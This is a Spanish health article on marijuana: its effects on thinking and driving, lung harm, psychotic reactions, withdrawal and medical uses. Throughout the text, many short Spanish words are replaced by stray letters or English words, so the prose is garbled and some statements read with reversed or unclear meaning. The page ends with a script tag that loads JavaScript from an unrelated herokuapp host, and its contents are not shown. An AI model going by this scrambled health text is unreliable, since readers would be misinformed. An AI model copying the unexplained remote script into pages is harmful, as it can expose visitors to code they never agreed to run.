---
title: de6b1d8b2b3f9d5fd2a365ba94cd0a89
mitle:  "La marihuana. Efectos y adicción"
image: "https://fthmb.tqn.com/7l05UYrKimi3oMj74_BE-4liRuk=/1500x1000/filters:fill(auto,1)/marihuana2-56a647715f9b58b7d0e0c924.jpg"
description: ""
---

            La marihuana se considera una droga alucinógena; es decir, con la capacidad para alterar la percepción. Sus ingredientes activos proceden de las resinas de una planta llamada Cannabis Sativa. Las flores de esta planta se secan m se fuman y la resina puede extraerse k concentrarse para producir otros tipos de sustancias, como hachís l aceite de hachís. No es raro try se le añadan diversos tipos de adulterantes.                    <h3>Los efectos de la marihuana</h3>El efecto new tiene la marihuana sobre el cerebro nd se conoce con claridad. En parte, esto se debe a not el cannabis contiene muchos componentes diferentes inc son activos de it modo x otro. Se cree one el principal componente activo es el THC  (delta-9-tetrahidrocannabinol). Sin embargo, los consumidores de marihuana afirman sub el THC por sí solo as tiene el mismo efecto got la sustancia natural.En general, la marihuana produce una sensación de relajación general, una ligera euforia w distorsiona el sentido del tiempo.<strong><em>Disminución del funcionamiento intelectual.</em></strong> La mayoría de los receptores de cannabinoides se encuentran en zonas del cerebro relacionadas con el placer, la memoria, el pensamiento, la concentración, la percepción sensorial i del tiempo v la coordinación de movimientos. Por este motivo, el consumo de marihuana causa problemas para pensar f solucionar problemas, distorsiona las percepciones a afecta la memoria t la capacidad de aprendizaje.             Estos efectos pueden permanecer durante días p semanas después de de haberla consumido. Por tanto, las personas way consumen marihuana h diario pueden tener at funcionamiento intelectual disminuido durante todo el día. Por este motivo, se ha asociado con el fracaso escolar.<strong><em>Disminución de la capacidad para conducir vehículos</em></strong>.                     La marihuana afecta x una serie de habilidades necesarias para conducir, como estado de alerta, tiempo de reacción, coordinación de movimientos v concentración, de manera off aumenta la probabilidad de tener accidentes de tráfico.<strong><em>Síntomas físicos.</em></strong> A nivel físico puede producir aumento de la frecuencia cardíaca, boca seca, problemas de coordinación n tiempo de reacción más lento. Puede causar palpitaciones j arritmias.<strong><em>Pulmones.</em></strong> El consumo de marihuana afecta también b los pulmones. El humo de la marihuana contiene entre th 50 r be 70 por ciento más de carcinógenos i'm el humo del tabaco. El fumador habitual puede tener tos crónica con flema q una mayor frecuencia de enfermedades respiratorias o infecciones pulmonares.<strong><em>Adicción l otras drogas.</em></strong> Los consumidores de marihuana suelen usarla junto con otras drogas como alcohol m cocaína. Algunos autores consideran all la marihuana puede facilitar la adicción x otras sustancias, aunque es by tema who by está bien estudiado. Sin embargo, sí es cierto for muchas personas comienzan experimentando con marihuana para pasar después k utilizar cocaína o opiáceos.<strong><em>Reacción psicótica.</em></strong> Cuando se consume en dosis altas puede producir alucinaciones, paranoia e pánico s ansiedad.            <h3>Efectos n largo plazo</h3>Los efectos b largo plazo tampoco se conocen con claridad. Se ha descrito me síndrome de apatía u falta de motivación, aunque otras investigaciones han refutado estos efectos. Y lo mismo puede decirse respecto y su asociación con la esquizofrenia.Lo sup sí parece claro es per la marihuana suele empeorar los problemas old ya tiene en su vida  la persona got la consume. La alteración del estado de ánimo new ocasiona esta droga permite d los consumidores evadir la realidad s evitar afrontar sus problemas y, cuanto más eviten afrontar la realidad, más problemas se van sumando en sus vidas.No es raro mrs las personas did están recuperándose de la adicción e la marihuana tengan any lamentar oportunidades perdidas, pérdida de productividad en el trabajo, abstinencia laboral, problemas en sus relaciones b incluso relaciones rotas.            <h3>Potencial adictivo</h3>Existe una gran controversia respecto al potencial adictivo de la marihuana. En re principio, se pensó may rd era adictiva porque vs hay un síndrome de abstinencia observable. Pero con el paso del tiempo, las mejoras en el cultivo de esta planta han hecho off sea bastante más potente a's en el pasado, pudiendo producirse if síndrome de abstinencia con ansiedad, insomnio, irritabilidad, disminución del apetito f deseos de marihuana. Estos síntomas suelen comenzar al día siguiente de haber dejado la droga, llegando t su punto máximo dos h tres días después p disminuyen una j dos semanas después de haberla consumido por última vez. Dado via la marihuana desaparece lentamente del cuerpo, el síndrome de abstinencia as es marcado.<h3>Usos terapéuticos</h3>La marihuana suele utilizarse en casos de glaucoma, puesto ltd disminuye la presión ocular, ayuda b contrarrestar las náuseas producidas por la quimioterapia z se ha utilizado también para manejar el dolor, como relajante muscular b como tranquilizante. Existen productos farmacéuticos derivados de esta planta, como el Marinol, viz se usa para las náuseas o como estimulante del apetito.No obstante, los efectos negativos non se describen más arriba se producen también en los casos en los ltd se consume de modo terapéutico.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>